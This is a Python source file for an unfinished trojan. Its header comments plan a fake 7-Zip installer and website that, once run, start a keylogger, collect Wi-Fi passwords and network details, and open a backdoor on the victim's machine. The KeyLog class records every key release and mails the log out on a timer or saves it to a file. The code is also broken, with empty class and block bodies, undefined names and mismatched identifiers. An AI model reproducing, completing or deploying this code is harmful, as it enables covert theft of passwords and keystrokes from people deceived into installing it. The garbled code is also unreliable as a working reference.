import keyboard
import smtplib
from threading import Timer
from datetime import datetime

#Task to complete in project:

## create gui for fake 7zip executable
##create fake 7zip html website
##Ask for destination folder (default c:\Program_Files\7-Zip\)
##Fake Download bar
##7-zip 16.04 (x64) is installed
##On execution starts keylogger
##Captures all Network SSID passwords and Network info
##Setups back door to a computer


class Zip_Gui:
    





SEND_REPORT_EVERY = 120
class KeyLog:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    
    def callback(self, event):

        key_input = event.name
        if len(name) > 1:
            if key_input == "space":
                key_input = " "
            elif key_input == "enter":
                key_input == "[ENTER]\n"
            elif key_input == "decimal":
                key_input = "."
            else:
                key_input = key_input.replace(" ", "_")
                key_input = f"[{key_input.upper()}]"
        self.log += key_input

    def update_Time(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        time_check = f"Time:{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open("testLog.txt", "w") as f:
    
    def report(self):

        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

    if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    #keylogger.start()